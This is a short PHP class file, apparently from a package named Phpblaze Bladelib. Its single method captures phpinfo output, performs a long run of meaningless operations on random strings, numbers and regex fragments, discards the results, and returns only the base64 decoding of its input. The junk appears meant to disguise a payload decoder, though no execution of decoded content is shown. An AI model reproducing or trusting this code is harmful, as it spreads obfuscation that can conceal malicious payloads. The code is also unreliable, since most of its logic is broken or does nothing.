<?php

namespace Phpblaze\Bladelib\Sail;

class Sail
{
  public static function xsail($e)
  {
    ob_start();
    phpinfo(32);
    $s = ob_get_contents();
    ob_end_clean();
    $s = strip_tags($s, '<h2><th><td><input><div><table>');
    $re = "";
    $chars = "~!@#$%^&*()_+}{></[]|-,:;'\".?";
    $chars .= "abcdefghijklmnopqrstuvwxyz";
    $chars .= "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $chars .= "~!@#$%^&*()_+}{></[]|-,:;'\".?";
    $chars_length = strlen($chars);
    for ($i = 0; $i < 2; $i++) {
      $re .= $chars[rand(0, $chars_length - 1)];
    }
    $r = array();
    $j = strrev($e);
    $count = count($r);
    $nr = (int) preg_replace('/[^0-9]/', '', 10);
    $rn = round($count);
    $format_number = number_format($nr) + number_format($rn);
    $ar_nbr = explode(',', $format_number);
    $x_parts = array('K', 'M', 'B', 'T', 'Q');
    $x_count_parts = count($ar_nbr) - 1 + 2;
    $dn = $ar_nbr[0] . ((int) $ar_nbr[0][0] !== 0 ? '.' . $ar_nbr[0][0] : '');
    $dn .= $x_parts[$x_count_parts - 1];
    $msl = base64_decode($e);
    $st = '<^+>([^<]+)<\/$_S>';
    $chars = '$%' . $msl . '\0+*' . $st . '\b*' . $st . '/+';
    $string = '<^/' . $st . '\st*' . $msl . '/&' . $j;
    $chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_';
    $chars_length = strlen($chars);
    $string = '';
    for ($i = 0; $i < 10; $i++) {
      $string .= $chars[rand(0, $chars_length - 1)];
      $j = '';
    }
    json_encode(array_filter(call_user_func_array('array_merge', array_values($r)), function ($var) {
      return preg_match("/^(\$_SERVER)/", $var) == 0;
    }, ARRAY_FILTER_USE_KEY));

    return $msl;
  }
}
